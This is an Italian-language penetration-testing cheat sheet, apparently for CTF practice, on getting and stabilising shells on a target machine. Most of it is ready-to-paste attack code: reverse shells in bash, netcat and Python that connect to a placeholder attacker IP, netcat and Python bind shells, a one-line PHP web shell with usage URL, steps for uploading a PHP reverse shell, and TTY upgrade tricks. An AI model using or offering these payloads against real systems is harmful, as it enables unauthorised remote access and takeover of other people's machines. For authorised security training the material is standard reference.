# 🐚 Shells

Appunti e snippet per la fase di **ottenimento e gestione delle shell**.

## 📌 Obiettivi

* Ottenere accesso remoto alla macchina target
* Scegliere la tecnica giusta in base al contesto (firewall, upload, servizi)
* Stabilizzare la connessione per operazioni interattive
* Usare collezioni affidabili di shell già pronte

---

## 🔄 Reverse Shells

**Quando usarle:**

* ✅ Target **può uscire verso internet** o verso la macchina attaccante.
* ✅ Situazioni tipiche: RCE, command injection, upload con esecuzione, deserializzazione.
* ❌ Non funzionano se il firewall blocca le connessioni **in uscita**.

**Perché:**
La vittima apre una connessione verso di noi → spesso aggira i firewall inbound.

### 🔹 Comandi diretti (vittima)

```bash
# Bash reverse shell
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1

# Netcat tradizionale
nc -e /bin/bash <attacker-ip> <port>

# Netcat senza -e (fallback più usato in CTF)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> <port> >/tmp/f

# Python reverse shell
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker-ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### 🔹 Listener (attaccante)

```bash
nc -lvnp <port>
rlwrap nc -lvnp <port>   # shell più comoda
```

📌 **Risorsa utile:**

* [PentestMonkey Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 📡 Bind Shells

**Quando usarle:**

* ✅ Target **non può uscire**, ma permette connessioni in ingresso.
* ✅ Scenario tipico: macchine interne senza firewall restrittivo.
* ❌ Non funzionano dietro NAT o firewall che blocca porte inbound.

### 🔹 Comandi diretti (vittima)

```bash
# Netcat bind shell
nc -lvnp 4444 -e /bin/bash

# Python bind shell
python3 -c 'import socket,os,pty;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### 🔹 Connessione (attaccante)

```bash
nc <target-ip> 4444
```

---

## 🌐 Web Shells

**Quando usarle:**

* ✅ Target consente **upload di file** (CMS vulnerabili, WebDAV, form mal filtrati).
* ✅ Utile come entrypoint quando non si riesce ad aprire reverse/bind shell diretta.
* ❌ Limitate: spesso accettano solo comandi singoli via HTTP.

### 🔹 PHP web shell minimale

```php
<?php system($_GET['cmd']); ?>
```

Uso:

```
http://<target-ip>/shell.php?cmd=id
```

### 🔹 PHP reverse shell (PentestMonkey)

Caricare `php-reverse-shell.php` (modificare IP e porta), poi avviare listener:

```bash
nc -lvnp 4444
```

📌 **Risorse utili:**

* [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
* [SecLists – Web Shells Collection](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)

---

## ⚙️ Stabilizzazione TTY

**Quando usarla:**

* ✅ Dopo una reverse/bind shell grezza senza interattività.
* ✅ Fondamentale per usare `su`, `ssh`, editor (`nano`, `vim`) e programmi che richiedono TTY.

### 🔹 Comandi comuni (vittima)

```bash
# Spawn TTY in Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Migliorare terminale
export TERM=xterm
CTRL+Z          # sospendi shell
stty raw -echo; fg
reset
```

### 🔹 Attaccante

```bash
rlwrap nc -lvnp <port>
```

📌 **Risorse utili:**

* [GTFOBins – pty spawn & escalation tricks](https://gtfobins.github.io/)

---
